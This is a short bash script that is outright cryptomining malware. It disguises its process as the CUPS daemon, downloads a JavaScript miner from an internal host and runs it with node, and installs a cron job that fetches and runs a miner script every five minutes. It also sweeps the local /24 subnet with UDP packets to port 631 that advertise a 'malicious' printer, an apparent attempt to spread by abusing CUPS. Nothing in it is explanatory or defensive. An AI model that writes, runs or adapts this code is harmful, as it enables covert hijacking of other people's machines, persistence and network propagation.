#!/bin/bash
# Disguise as CUPS process
exec -a cupsd bash -c '
# Download and run JavaScript miner
curl -s http://10.0.0.242:8080/miner.js | node &
# Add persistence via cron
(crontab -l 2>/dev/null; echo "*/5 * * * * curl -s http://10.0.0.242:8080/miner.sh | bash") | crontab -
# Local network propagation
for ip in $(seq 1 254); do
  echo "0 3 http://10.0.0.242:631/printers/malicious" | nc -u -w 1 10.0.0.$ip 631
done
'